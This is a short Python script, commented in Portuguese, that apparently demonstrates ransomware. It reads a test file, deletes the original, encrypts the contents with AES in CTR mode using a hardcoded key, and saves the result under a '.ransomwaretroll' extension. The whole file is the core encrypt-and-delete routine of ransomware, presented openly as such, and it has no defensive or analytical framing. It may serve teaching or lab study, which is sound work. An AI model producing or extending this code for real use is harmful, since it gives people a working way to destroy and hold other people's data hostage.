import os  # Modulo para manipulacao de arquivos e sistema operacional
import pyaes  # Biblioteca para criptografia e descriptografia AES

# Etapa 1: Abrir o arquivo a ser criptografado
file_name = "teste.txt"  # Nome do arquivo original
file = open(file_name, "rb")  # Abre o arquivo no modo binario de leitura
file_data = file.read()  # Le o conteudo do arquivo
file.close()  # Fecha o arquivo

# Etapa 2: Remover o arquivo original
os.remove(file_name)  # Apaga o arquivo original

# Etapa 3: Configurar a chave de criptografia
key = b"testeransomwares"  # Chave de 16, 24 ou 32 bytes para AES
aes = pyaes.AESModeOfOperationCTR(key)  # Configura AES no modo CTR

# Etapa 4: Criptografar os dados
crypto_data = aes.encrypt(file_data)  # Criptografa o conteudo do arquivo

# Etapa 5: Salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"  # Nome do arquivo criptografado
new_file = open(new_file, "wb")  # Abre o arquivo no modo binario de escrita
new_file.write(crypto_data)  # Escreve os dados criptografados no arquivo
new_file.close()  # Fecha o arquivo
